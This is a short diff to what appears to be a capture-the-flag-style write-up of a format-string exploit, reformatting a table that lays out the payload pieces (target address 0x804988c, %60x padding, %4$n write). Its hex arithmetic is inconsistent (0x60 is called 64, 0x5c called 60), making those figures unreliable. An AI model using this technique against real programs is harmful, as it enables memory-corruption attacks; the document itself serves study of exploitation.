@@ -74,9 +74,9 @@ End of assembler dump.
 # printf. Here we want to write 64 bytes at address 0x804988c.
 # Knowing all this, we can craft the malicious format string :
 
-[target]	[wanted value - sizeof(target)]		[offset on stack]
-[m]			[0x60 - sizeof(m) = 0x5c = 60]		[$esp + 4]
-[0x804988c]	[%60x]								[%4$n]
+[target]   [wanted value - sizeof(target)][offset of buffer from esp in words]
+[m]        [0x60 - sizeof(m) = 0x5c = 60] [$esp + 4]
+[0x804988c][%60x]                         [%4$n]
 
 # See './Resources/payload.py' for the content of the script.
 # Finally, the result is :
